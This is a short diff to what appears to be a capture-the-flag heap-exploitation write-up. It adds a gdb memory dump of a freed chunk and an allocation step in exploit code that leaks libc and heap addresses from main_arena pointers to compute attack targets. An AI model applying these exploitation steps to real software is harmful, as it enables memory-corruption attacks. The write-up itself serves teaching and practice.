@@ -95,6 +95,17 @@ input during allocation we will be able to leak the `main arena` pointer.
 
 ```python
 free(0)
+```
+
+```
+0x555555757100:	0x0000000000000000	0x0000000000000091 <-- chunk 0
+0x555555757110:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
+0x555555757120:	0x0000000000000000	0x0000000000000000
+0x555555757130:	0x0000000000000000	0x0000000000000000
+0x555555757140:	0x0000000000000000	0x0000000000000000
+```
+
+```python
 alloc(0x88, 0)
 
 libc    = libcLeak() - 0x3c4b78
@@ -137,6 +148,7 @@ free(2)
 
 
 ```python
+alloc(0x68, 2)
 heap   = heapLeak() & 0xFFFFFFFFFFFFF000
 target = heap + 0x278
 log.success("Heap:          0x{:x}".format(heap))
